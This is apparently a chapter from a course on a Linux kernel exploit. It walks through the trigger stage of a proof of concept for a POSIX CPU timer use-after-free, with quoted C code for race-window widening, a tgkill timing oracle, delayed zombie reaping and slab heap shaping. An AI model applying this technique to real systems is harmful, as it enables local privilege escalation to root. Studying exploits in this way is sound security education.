# Chapter 8 — Reading the trigger in the PoC

Goal of this chapter: no new kernel theory. We take the seven requirements from
chapter 7 and find, one by one, the exact PoC code that satisfies them. When
you finish, `run_target()` and its helpers should read like a checklist you
already know.

Reference: `InfinityCore/timer/CVE-2026-98260-ubuntu.c` (line numbers are from
that file).

## 1. The orchestration around the trigger

`main()` (1459) forks a `launcher` (for the final root pivot, chapter 12) and
then runs up to `MAX_EXPLOIT_ATTEMPTS` (3) attempts of `run_exploit_attempt()`
(1255). The attempt is:

```
run_exploit_attempt():
  setup_timer_oracle()            # 392 worker threads, each with a clockid
  create_slab_padding()           # 4200 timers, held alive (heap shaping)
  fork() -> child runs run_target()          # the actual trigger
  wait_zombie_without_reap(child)            # zombie exists, NOT reaped yet
  recycle_victim_into_oracle_pool()          # RCU "filler" batch
  nanosleep(3s)                              # let RCU do its thing
  allocate_oracle_candidates()               # 392 fresh k_itimer allocations
  waitpid(child)                             # <-- reap: the UAF fires here
  ... heap preparation, AIO spray ...
  run_stage1()                               # leak (chapters 9-10)
```

Keep the two marked steps in mind: the exploit deliberately *delays* the reap,
and it *allocates fresh timer objects before* letting the reap happen.

## 2. `run_target()` — the target process (1212–1236)

```c
	atomic_store(&state.target_tgid, getpid());
	if (prepare_fragmented_range()) _exit(110);
	for (i = 0; i < LOCKERS; i++)
		if (spawn_vm_helper(locker) < 0) _exit(111);
	if (spawn_vm_helper(killer) < 0) _exit(112);

	sigemptyset(&set); sigaddset(&set, SIGRTMIN);
	pthread_sigmask(SIG_BLOCK, &set, NULL);
	if (pthread_create(&thread, NULL, exec_thread, NULL)) _exit(114);
	for (;;) sched_yield();
```

Three things to note:

### 2.1 `prepare_fragmented_range()` — 50,000 tiny VMAs (1148–1175)

The process creates a memfd with a single page and then maps that page
50,000 times at fixed addresses (`MAP_FIXED`), producing 50,000 separate
one-page VMAs. Why: VMA-list walks (mprotect, mmap, the mm teardown that
`exec_mmap` triggers) now take a long time and constantly fight for the
`mmap_lock`. That is the window-widening mechanism for chapter 7 §5: the
victim must still be *inside* `exec_mmap` when the SIGKILL arrives.

### 2.2 The helpers are processes, not threads (1132–1146)

```c
	pid = clone(fn, stack + HELPER_STACK, CLONE_VM | SIGCHLD, NULL);
```

`CLONE_VM` without `CLONE_THREAD`: the helpers share the target's address
space (so they can read/write the `state` struct) but are *separate processes*
— different thread group. Therefore `de_thread()`'s `zap_other_threads()` does
not kill them; they outlive the victim. That's the whole reason for this
construction: on one side, leader + exec thread (a real thread group that
`de_thread` can collapse), on the other side, independent observers/players
that can keep acting during the exec.

`LOCKERS = 3` lockers and 1 killer are spawned this way.

### 2.3 The exec thread is created last (1231)

`pthread_create` → non-leader thread. The leader (the thread executing
`run_target`) then spins forever; it exists only to be killed by `de_thread`.

## 3. `exec_thread()` — the victim (1177–1210)

```c
	event.sigev_notify = SIGEV_SIGNAL;
	event.sigev_signo  = SIGRTMIN;
	dormant_timer.it_value.tv_sec = 3600;

	timer_create(CLOCK_THREAD_CPUTIME_ID, &event, &timerid);
	timer_settime(timerid, 0, &dormant_timer, NULL);

	atomic_store(&state.exec_tid, raw_gettid());
	atomic_store(&state.go, 1);
	while (state.locker_started < LOCKERS) sched_yield();
	for (volatile i = 0; i < 5000000UL; i++) ;
	execve("/proc/self/exe", argv, envp);
	_exit(122);
```

This is chapter 3 in one function: a **per-thread** CPU timer, armed one hour
into the future. It will never fire; it only needs to exist, armed, with its
node queued in *this thread's* SCHED queue and `it.cpu.pid` = this thread's
`struct pid`. Requirement 1 of chapter 7 — done.

Then it publishes its TID for the killer, waits until all lockers run, burns a
little CPU — and calls `execve` **on itself**. The self-exec goes to
`/proc/self/exe` with `argv[0]` = empty string; if the exec actually
succeeds (race lost), the new image detects that empty argv[0] in
`/proc/self/cmdline` (`is_reexec_image()`, 1383) and exits quietly (`_exit(42)`
in `main`, 1485), so the wrapper can retry. A lost race is harmless; it must
just not corrupt anything.

## 4. `locker()` — fighting for the mmap lock (1086–1106)

```c
	slot = atomic_fetch_add(&state.locker_cpu, 1);
	pin_cpu(slot ? 3 : 1);
	while (!state.go) sched_yield();
	while (!state.stop) {
		syscall(SYS_mprotect, state.base, state.len, prot);
		prot = (prot == PROT_NONE) ? PROT_READ : PROT_NONE;
	}
```

Each locker continuously flips the protection of all 50,000 VMAs. That both
makes `exec_mmap`'s teardown/walk of the old mm slow and keeps the `mmap_lock`
busy, so the victim spends a long time in lockable/killable kernel waits after
`de_thread` — exactly where chapter 7 wants it. Note that lockers run on
different CPUs (pin_cpu) so they genuinely contend.

## 5. `killer()` — the timing oracle (1108–1130)

```c
	while (!(tid = state.exec_tid)) sched_yield();
	tgid = state.target_tgid;
	for (;;) {
		long ret = tgkill(tgid, tid, 0);
		if (ret < 0 && errno == ESRCH)
			break;
		sched_yield();
	}
	tgkill(tgid, tgid, SIGKILL);
	state.stop = 1;
```

`tgkill(tgid, tid, 0)` is signal number zero: no signal is sent, the call
just *checks that the TID exists*. It returns `ESRCH` exactly when the old
TID no longer resolves to any task.

When does that happen? From chapter 5: the victim's old `P_t` stops naming a
task only in `release_task(leader)` (inside `de_thread`). So the loop is a
precise, userspace-visible proof of:

> `exchange_tids()` happened **and** the old leader was released.

Only then does the killer send SIGKILL to the thread group. The victim is (if
everything timed well) inside a killable wait in `exec_mmap`; the SIGKILL
turns it into `-EINTR`; `point_of_no_return` makes the failure fatal. The
killer also sets `state.stop`, which is how the CLONE_VM lockers learn to
stop.

This is requirement 6 of chapter 7, implemented as a race the exploit can
actually win: the ESRCH check removes all guesswork about *when* the surgery
finished.

## 6. `wait_zombie_without_reap()` — keeping the dead alive (1238–1253)

```c
	for (i = 0; i < 3000; i++) {
		if (waitid(P_PID, pid, si, WEXITED | WNOHANG | WNOWAIT))
			return -1;
		if (si->si_pid == pid)
			return 0;
		nanosleep(&pause /* 10 ms */, NULL);
	}
```

`WNOWAIT` is the trick: `waitid` reports the child's death **without reaping
it**. So the parent knows the trigger finished (the victim died, `do_exit`
freed the timer object via `exit_itimers`) while the zombie — and therefore
the stale node in its SCHED queue — is still *alive and untouched*. Requirement
5, and the instrument that lets the exploit choose the moment of the UAF.

## 7. `recycle_victim_into_oracle_pool()` — shaping the deferred free (957–975)

```c
	for (i = 0; i < RCU_RECLAIM_FILLERS /* 279 */; i++) {
		timer_create(CLOCK_MONOTONIC, &sigev_none_event, &ids[i]);
	}
	for (i = 0; i < made; i++)
		timer_delete(ids[i]);
```

279 timers are created and immediately deleted. `timer_delete` frees their
`k_itimer`s through the same `kfree_rcu` machinery as the victim's object. The
count is not random — chapter 13 explains the SLUB sheaves/barn arithmetic
(279 + 1 victim = 280 = one full barn of 10 sheaves × 28 objects). For now:
this is the first deliberate heap-shaping step, whose purpose is to make
*where* the victim's freed slot ends up predictable.

## 8. `allocate_oracle_candidates()` — where the node lands (413–424)

Each of the 392 oracle workers gets a fresh timer on its **own**
`pthread_getcpuclockid()` clock, armed 20 ms in the future
(`create_cpu_timer`, 351–372, SIGEV_SIGNAL with `SIGRTMIN+2`).

`timer_create` allocates a `k_itimer` from `posix_timers_cache`. 392
allocations are the exploit's attempt to make exactly one of them reuse the
victim's freed slot. If it succeeds, then the address that the zombie's tree
still holds now belongs to a **live worker's timer object** — same offset
inside it (`it.cpu.node` is at the same place in every `k_itimer`).

The workers are the "oracle": 392 independent candidates, and the exploit will
later observe which one misbehaves and learn from it (chapters 9–10). This is
14 × 28 — the bookkeeping for the SLUB pages, again for chapter 13.

## 9. `waitpid()` — the UAF fires (1313)

The moment the parent finally reaps:

```
waitpid(child) → release_task(child)
  → __exit_signal(child)
    → posix_cpu_timers_exit(child)          (exit.c:171)
      → cleanup_timerqueue(&child->posix_cputimers.bases[SCHED].tqhead)
        → timerqueue_getnext()  returns the stale node address
        → timerqueue_del()      reads/writes through it
```

And `timerqueue_del` is immediately followed in `cleanup_timerqueue` by:

```c
	ctmr = container_of(node, struct cpu_timer, node);
	ctmr->head = NULL;
```

which writes into the *live* worker's object (if the reclaim worked): the
worker's timer now claims `head == NULL` while its node is still linked in the
worker's own live tree. That single mismatched bit is the "transfer trick" —
chapter 9 picks it up from here.

One more consequence of the ordering (reap *after* allocate, not before): the
zombie's timer object was freed at exit, but its slot was only *reused* later.
At reap time the kernel is already reading an object that, as far as the
kernel is concerned, belongs to somebody else.

## 10. Chapter 7's checklist against the PoC

| # (ch. 7) | requirement | PoC code |
|---|---|---|
| 1 | per-thread CPU timer | `exec_thread` 1194–1197 (`CLOCK_THREAD_CPUTIME_ID`) |
| 2 | non-leader execer | `pthread_create(..., exec_thread, ...)` 1231 |
| 3 | failure after `point_of_no_return` | `killer` 1119–1127 + killable locks in `exec_mmap` |
| 4 | execer is last live thread | `de_thread` kills the leader (the `run_target` thread) |
| 5 | delayed reap | `wait_zombie_without_reap` 1238–1253; reap at 1313 |
| 6 | well-timed kill after the surgery | `tgkill(...,0) == ESRCH` loop 1119–1125 |
| 7 | unconditional queue cleanup at reap | `waitpid` → `cleanup_timerqueue` |

## Hands-on

1. Read the PoC regions in this order (they are short): 1086–1146
   (`locker`, `killer`, `spawn_vm_helper`), 1148–1175
   (`prepare_fragmented_range`), 1177–1236 (`exec_thread`, `run_target`),
   1238–1253 (`wait_zombie_without_reap`), 1289–1316 (the orchestration
   around fork/wait/reap), 957–975 (`recycle_...`), 413–424
   (`allocate_oracle_candidates`).
2. For each line of chapter 7's checklist, write the PoC line next to it
   *without looking at §10*. Repeat until you don't need either.
3. Answer: why is `WNOWAIT` essential, and what would break if the parent
   reaped the child immediately after it died?
4. Answer: why must `allocate_oracle_candidates()` run **before**
   `waitpid()`? What would the reap do if no new object had reused the slot?
   (Hint: chapter 4 §8 — "the tree still points at a freed node".)
5. Extra: `exec_thread` uses `argv[0] = ""`. Find `is_reexec_image()` and
   explain in one sentence how the exploit detects a *successful* exec and
   why it treats that as "attempt lost, try again" instead of a failure.

## Checkpoint

1. What does the killer's ESRCH loop actually prove about kernel state?
2. Why are the lockers and killer CLONE_VM *processes* and not threads?
3. In which function does the UAF happen, and who calls it?
4. What does the UAF leave behind *inside the live worker's timer object*, and
   which line of `cleanup_timerqueue` writes it?
5. Why does the exploit create 279 timers and delete them right away, before
   touching the zombie?
